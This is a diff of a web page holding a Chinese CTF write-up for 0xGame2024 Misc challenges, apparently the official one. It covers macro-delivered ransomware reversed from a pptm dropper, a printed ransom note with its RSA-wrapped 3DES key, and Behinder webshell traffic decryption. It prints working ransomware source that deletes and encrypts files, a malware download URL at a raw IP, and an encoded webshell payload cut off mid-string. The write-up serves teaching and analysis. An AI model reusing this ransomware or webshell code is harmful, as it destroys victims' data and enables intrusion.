-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130638119-019fc670-6063-4f07-9960-0d586c637a4d.png" alt="img"></p>
 <p>上网找找资料可以知道这是兽音编码后的结果：</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730130638141-7ce00bf5-e5a8-430a-8c42-b22866fcacbe.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130638141-7ce00bf5-e5a8-430a-8c42-b22866fcacbe.png" alt="img"></p>
 <p>四段拼起来就是flag</p>
-<h3 id="crazy-thursday-v-me-50-btc">Crazy Thursday v me 50 btc*</h3>
-<p>下载下来的附件中有一个pptm文件，搜索一下可以知道这是一个启用了宏的ppt，查看一下宏代码。</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805642487-473cd06e-7f5a-49a1-b100-fcd878c9f25c.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<h3 id="Crazy-Thursday-v-me-50-btc"><a href="#Crazy-Thursday-v-me-50-btc" class="headerlink" title="Crazy Thursday v me 50 btc*"></a>Crazy Thursday v me 50 btc*</h3><p>下载下来的附件中有一个pptm文件，搜索一下可以知道这是一个启用了宏的ppt，查看一下宏代码。</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805642487-473cd06e-7f5a-49a1-b100-fcd878c9f25c.png" alt="img"></p>
 <p>（另外这里还有个小彩蛋，移开第二张ppt里的图片可以看到一行字，不过这与题目无关）</p>
-<figure>
-<img
-src="https://cdn.nlark.com/yuque/0/2024/png/46824302/1730805642882-7f23840a-dfb2-4223-8c12-8ad7820a1387.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_1125%2Climit_0"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46824302/1730805642882-7f23840a-dfb2-4223-8c12-8ad7820a1387.png?x-oss-process=image/format,webp/resize,w_1125,limit_0" alt="img"></p>
 <p>这里的逻辑是在播放到第二张ppt的时候就从某个服务器上下载summer.exe并运行。</p>
-<p>访问一下http://47.239.17.55/summer.exe，下载得到summer.exe。</p>
+<p>访问一下<a target="_blank" rel="noopener external nofollow noreferrer" href="http://47.239.17.55/summer.exe%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%BE%97%E5%88%B0summer.exe%E3%80%82">http://47.239.17.55/summer.exe，下载得到summer.exe。</a></p>
 <p>丢进exeinfope查一下，可以看到这个程序是用python编写的，或者熟悉的可以直接从图标看出来这点。</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805643014-9fbb4bd1-6fae-40d5-96ee-c65a18f64a5b.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>先用<a
-target="_blank" rel="noopener" href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor.py</a>将其拆为pyc文件</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805643061-c6df86d5-1177-4984-bf04-8fbcc76cf402.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>从拆解出的文件中找到summer.pyc，使用uncompyle6（pip
-install下载）对其进行反编译，得到python代码。</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805643130-57f10e22-f8a5-4c83-8954-745771b854af.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805643014-9fbb4bd1-6fae-40d5-96ee-c65a18f64a5b.png" alt="img"></p>
+<p>先用<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor.py</a>将其拆为pyc文件</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805643061-c6df86d5-1177-4984-bf04-8fbcc76cf402.png" alt="img"></p>
+<p>从拆解出的文件中找到summer.pyc，使用uncompyle6（pip install下载）对其进行反编译，得到python代码。</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805643130-57f10e22-f8a5-4c83-8954-745771b854af.png" alt="img"></p>
 <p>正如在题目描述中所说，这里为了师傅们电脑的安全性，删除了文件加密和原文件删除的相关代码，但是这并不影响做题，接下来在这里贴出未删减版：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> fnmatch</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> k3y,readme</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params"><span class="built_in">dir</span>=<span class="string">&#x27;.&#x27;</span>, ext=[<span class="string">&#x27;.txt&#x27;</span>, <span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;.7z&#x27;</span>, <span class="string">&#x27;.rar&#x27;</span>, <span class="string">&#x27;.gz&#x27;</span>, <span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;.bmp&#x27;</span>, <span class="string">&#x27;.gif&#x27;</span>, <span class="string">&#x27;.mp3&#x27;</span>, <span class="string">&#x27;.wav&#x27;</span>, <span class="string">&#x27;.avi&#x27;</span>, <span class="string">&#x27;.doc&#x27;</span>, <span class="string">&#x27;.docx&#x27;</span>, <span class="string">&#x27;.xls&#x27;</span>, <span class="string">&#x27;.xlsx&#x27;</span>, <span class="string">&#x27;.pdf&#x27;</span>, <span class="string">&#x27;.ppt&#x27;</span>, <span class="string">&#x27;.pptx&#x27;</span>, <span class="string">&#x27;.mp4&#x27;</span>, <span class="string">&#x27;.mov&#x27;</span>, <span class="string">&#x27;.flv&#x27;</span>, <span class="string">&#x27;.mkv&#x27;</span>, <span class="string">&#x27;.swf&#x27;</span>, <span class="string">&#x27;.dll&#x27;</span>, <span class="string">&#x27;.sys&#x27;</span>, <span class="string">&#x27;.iso&#x27;</span>, <span class="string">&#x27;.vmdk&#x27;</span>, <span class="string">&#x27;.vhd&#x27;</span>, <span class="string">&#x27;.vhdx&#x27;</span>, <span class="string">&#x27;.ova&#x27;</span>,]</span>):</span><br><span class="line">    ff = []</span><br><span class="line">    <span class="keyword">for</span> ro, di, fi <span class="keyword">in</span> os.walk(<span class="built_in">dir</span>):</span><br><span class="line">        <span class="keyword">for</span> ex <span class="keyword">in</span> ext:</span><br><span class="line">            <span class="keyword">for</span> na <span class="keyword">in</span> fnmatch.<span class="built_in">filter</span>(fi, <span class="string">&#x27;*&#x27;</span> + ex):</span><br><span class="line">                fp = os.path.join(ro, na)</span><br><span class="line">                ff.append(fp)</span><br><span class="line">    <span class="keyword">return</span> ff</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt1</span>(<span class="params">key, plaintext</span>):</span><br><span class="line">    cipher = DES3.new(key, DES3.MODE_ECB)</span><br><span class="line">    padded_plaintext = pad(plaintext, DES3.block_size)</span><br><span class="line">    ciphertext = cipher.encrypt(padded_plaintext)</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt2</span>(<span class="params">m</span>):</span><br><span class="line">    p=getPrime(<span class="number">256</span>)</span><br><span class="line">    q=getPrime(<span class="number">256</span>)</span><br><span class="line">    n=p*q</span><br><span class="line">    e=<span class="number">65537</span></span><br><span class="line">    m1 = bytes_to_long(m)</span><br><span class="line">    c = <span class="built_in">pow</span>(m1, e, n)</span><br><span class="line">    <span class="keyword">return</span> (n,c)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">release</span>(<span class="params">txt,m</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;Oops!.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(txt+<span class="string">&#x27;\n\n\n&#x27;</span>)</span><br><span class="line">        f.write(base64.b64encode((<span class="built_in">str</span>(m[<span class="number">0</span>].bit_length())+<span class="built_in">str</span>(m[<span class="number">0</span>])+<span class="built_in">str</span>(m[<span class="number">1</span>].bit_length())+<span class="built_in">str</span>(m[<span class="number">1</span>])).encode()).decode())</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    fl = f()</span><br><span class="line">    <span class="keyword">for</span> fi <span class="keyword">in</span> fl:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(fi, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line">        os.remove(fi)</span><br><span class="line">        data = encrypt1(k3y, data)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(fi+<span class="string">&#x27;.encrypted&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(data)</span><br><span class="line">    msg=encrypt2(k3y)</span><br><span class="line">    release(readme,msg)</span><br></pre></td></tr></table></figure>
+
 <p>这里的代码明显是出题人自己手搓的，所以网上是没法找到用于解密的程序的。</p>
-<p>接下来阅读一下代码的逻辑，可以看出大概是这样一个过程：查找当前目录下一些特定后缀名的文件--&gt;读取文件内容--&gt;删除原文件--&gt;对文件内容进行3DES加密--&gt;将内容写进一个新的文件，文件名为原文件名加上.encrypted--&gt;对前面一步中3DES时使用的密钥进行RSA加密，并且将RSA使用的n和加密后的密文以特定格式拼接后进行base64编码，以特定格式写入一同释放的文本中。</p>
+<p>接下来阅读一下代码的逻辑，可以看出大概是这样一个过程：查找当前目录下一些特定后缀名的文件–&gt;读取文件内容–&gt;删除原文件–&gt;对文件内容进行3DES加密–&gt;将内容写进一个新的文件，文件名为原文件名加上.encrypted–&gt;对前面一步中3DES时使用的密钥进行RSA加密，并且将RSA使用的n和加密后的密文以特定格式拼接后进行base64编码，以特定格式写入一同释放的文本中。</p>
 <p>文本在附件中已经给出，就是Oops!.txt，内容如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Hello, w8nn9z! </span><br><span class="line">Your file has been encrypted! </span><br><span class="line">I have to inform you that due to my special encryption algorithm, all important files on your computer have been encrypted! This means that without a special key provided by me, you will not be able to access these files. </span><br><span class="line">To recover your files, you must follow the following steps: </span><br><span class="line">1. Pay the equivalent of $50 in Bitcoin to the designated Bitcoin address before the next Crazy Thursday. :) </span><br><span class="line">2. After payment is completed, please send the transaction ID and the string at the end of this file via email to st4rr@example.com . </span><br><span class="line">3. After receiving your payment confirmation, I will provide you with the key and the instruction on how to use it. </span><br><span class="line">If payment is not received within 72 hours, the price of the decryption instruction will double. In addition, if you attempt to recover data on your own or do not follow instructions, your files may be permanently deleted. :( </span><br><span class="line">Warning: Do not attempt to unlock files or use third-party tools on your own, as this may result in irreversible data loss. Similarly, any cooperation with law enforcement agencies will result in the destruction of keys, making it impossible to recover files. :( </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NTExNjYyMjMyMDc3MDI1MjcxMzk4MzA0OTUyNTUzODUyOTQ0MjM5OTgwNjM5OTExNDYwMTE1NjA0MjQ3OTE2MjU1NjUwMTc0MzAyNTU0NjMwMTk4MjEzMTAxMzk3MDQzMDk0OTYxMjc1OTQ5ODkwOTUwODg5NDM1NDM2ODg2Nzk1OTQwNzYzODY0MjI3MjUzNTQ0MDc2NzUxMTkzMzUwOTE0NjMzOTUyOTEzNTQ0MTQwMzMyNDE4NjYyMjczNzEyNTQ3OTA4OTgxNTY1MzUxNDEzNjU3NTUzMzYxNDcxNjQzOTIwMzc4ODQwOTk2NDI4NDgyMTI3MDEwNTAzMDI2MDY3NTg3MzkyMDAwMDMwNDY1Mzc3MjAzNDQzNTk3MDI3MTE4OTA3MTE2OTE1MTAyODkwOTcwNDYzNzI=</span><br></pre></td></tr></table></figure>
+
 <p>最后的一行base64编码显然就是解密用的关键信息。</p>
 <p>需要说明的是，这里用上面的方法去逆向secret.pyc会发现，我们要找的密钥是随机生成的，没法直接得到。secret.py的代码如下</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line">k3y=<span class="string">b&#x27;Summer&#x27;</span>+get_random_bytes(<span class="number">18</span>)</span><br><span class="line">readme=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Hello, w8nn9z! </span></span><br><span class="line"><span class="string">Your file has been encrypted! </span></span><br><span class="line"><span class="string">I have to inform you that due to my special encryption algorithm, all important files on your computer have been encrypted! This means that without a special key provided by me, you will not be able to access these files. </span></span><br><span class="line"><span class="string">To recover your files, you must follow the following steps: </span></span><br><span class="line"><span class="string">1. Pay the equivalent of $50 in Bitcoin to the designated Bitcoin address before the next Crazy Thursday. :) </span></span><br><span class="line"><span class="string">2. After payment is completed, please send the transaction ID and the string at the end of this file via email to st4rr@example.com . </span></span><br><span class="line"><span class="string">3. After receiving your payment confirmation, I will provide you with the key and the instruction on how to use it. </span></span><br><span class="line"><span class="string">If payment is not received within 72 hours, the price of the decryption instruction will double. In addition, if you attempt to recover data on your own or do not follow instructions, your files may be permanently deleted. :( </span></span><br><span class="line"><span class="string">Warning: Do not attempt to unlock files or use third-party tools on your own, as this may result in irreversible data loss. Similarly, any cooperation with law enforcement agencies will result in the destruction of keys, making it impossible to recover files. :( </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
 <p>那么来看下怎么分析这串base64编码，当然首先是解码，得到一串数字</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">51166223207702527139830495255385294423998063991146011560424791625565017430255463019821310139704309496127594989095088943543688679594076386422725354407675119335091463395291354414033241866227371254790898156535141365755336147164392037884099642848212701050302606758739200003046537720344359702711890711691510289097046372</span><br></pre></td></tr></table></figure>
-<p>通过分析代码得到，这串数字的格式是
-n的二进制长度+n+c的二进制长度+c，因此不难进行如下分段</p>
+
+<p>通过分析代码得到，这串数字的格式是 n的二进制长度+n+c的二进制长度+c，因此不难进行如下分段</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">511</span><br><span class="line">6622320770252713983049525538529442399806399114601156042479162556501743025546301982131013970430949612759498909508894354368867959407638642272535440767511933</span><br><span class="line">509</span><br><span class="line">1463395291354414033241866227371254790898156535141365755336147164392037884099642848212701050302606758739200003046537720344359702711890711691510289097046372</span><br></pre></td></tr></table></figure>
+
 <p>使用factordb分解一下n，这里在出题时已经提前将p和q提交到了factordb</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805643080-39b31174-8565-4689-b2a2-3d634db908e8.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805643080-39b31174-8565-4689-b2a2-3d634db908e8.png" alt="img"></p>
 <p>RSA应该不必多说了，网上能找到很多教程，接下来写个脚本解密附件中的autumn.wav.encrypted</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line">p=<span class="number">64816076191920076931967680257669007967886202806676552562757735711115285212307</span></span><br><span class="line">q=<span class="number">102170960652478489355215071707263191814765888101601364955857801471459364198319</span></span><br><span class="line">n=<span class="number">6622320770252713983049525538529442399806399114601156042479162556501743025546301982131013970430949612759498909508894354368867959407638642272535440767511933</span></span><br><span class="line">c=<span class="number">1463395291354414033241866227371254790898156535141365755336147164392037884099642848212701050302606758739200003046537720344359702711890711691510289097046372</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(<span class="number">65537</span>,phi)</span><br><span class="line">key=long_to_bytes(<span class="built_in">pow</span>(c,d,n))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;autumn.wav.encrypted&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ciphertext=f.read().strip()</span><br><span class="line">    cipher = DES3.new(key, DES3.MODE_ECB)</span><br><span class="line">    padded_plaintext = cipher.decrypt(ciphertext)</span><br><span class="line">    plaintext = unpad(padded_plaintext, DES3.block_size)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;autumn.wav&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(plaintext)</span><br></pre></td></tr></table></figure>
+
 <p>这样就成功得到了autumn.wav。先用010editor看一下，在文件末尾可以发现一串暂时不知道干什么用的密码</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805643689-fc26364f-d01e-4a5c-aa1e-3edf7a1b967a.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805643689-fc26364f-d01e-4a5c-aa1e-3edf7a1b967a.png" alt="img"></p>
 <p>这里是存在deepsound的隐写，其实有些师傅看了hint就知道了。这里需要将deepsound更新到较新的版本才能提取出来。</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805643666-bea466c6-53da-43bc-bb04-649c47c63c9b.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805643666-bea466c6-53da-43bc-bb04-649c47c63c9b.png" alt="img"></p>
 <p>打开winter.txt，里面看似什么都没有，但实际上有很多空格，这个是snow隐写</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805643630-c9c92b28-926c-4060-a0b6-13ae8a9e0f1d.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805643630-c9c92b28-926c-4060-a0b6-13ae8a9e0f1d.png" alt="img"></p>
 <p>用前面在010中得到密码提取，得到flag</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805643731-98dce7bb-e92a-45de-90b2-fc02986d94b9.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<h3 id="encrypted-file">Encrypted file</h3>
-<p>附件给了一个 <code>secret.php</code> 和一个
-<code>Behinder.pcapng</code>，php打开是乱码还不知道有什么用先放一边，先分析流量包，搜搜文件名就大概可以知道是冰蝎流量，网上有很多资料可以参考</p>
-<p>流量前面一大段都是用
-<code>dirsearch</code>在扫目录，可以发现攻击者找到一个<code>upload.php</code>，之后就是经典的冰蝎流量分析：</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730805644244-3435aa47-cc8c-47c9-a80e-da9e4e18f585.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>上传的 <code>shell.php</code>
-的作用是对后续的攻击命令进行解密并执行，可以直接用于解密流量里的攻击命令，第一段和第二段分别是在进行密钥协商和返回phpinfo()的命令回显，可以直接从第三段开始往后进行分析</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805643731-98dce7bb-e92a-45de-90b2-fc02986d94b9.png" alt="img"></p>
+<h3 id="Encrypted-file"><a href="#Encrypted-file" class="headerlink" title="Encrypted file"></a>Encrypted file</h3><p>附件给了一个 <code>secret.php</code> 和一个 <code>Behinder.pcapng</code>，php打开是乱码还不知道有什么用先放一边，先分析流量包，搜搜文件名就大概可以知道是冰蝎流量，网上有很多资料可以参考</p>
+<p>流量前面一大段都是用 <code>dirsearch</code>在扫目录，可以发现攻击者找到一个<code>upload.php</code>，之后就是经典的冰蝎流量分析：</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805644244-3435aa47-cc8c-47c9-a80e-da9e4e18f585.png" alt="img"></p>
+<p>上传的 <code>shell.php</code> 的作用是对后续的攻击命令进行解密并执行，可以直接用于解密流量里的攻击命令，第一段和第二段分别是在进行密钥协商和返回phpinfo()的命令回显，可以直接从第三段开始往后进行分析</p>
 <p>以第三段为例，直接用流量里的 <code>shell.php</code> 进行解密：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Decrypt</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; </span><br><span class="line">    <span class="variable">$bs</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">    <span class="variable">$after</span>=<span class="variable">$bs</span>(<span class="variable">$data</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$after</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$after</span>[<span class="variable">$i</span>] = <span class="variable">$after</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$after</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;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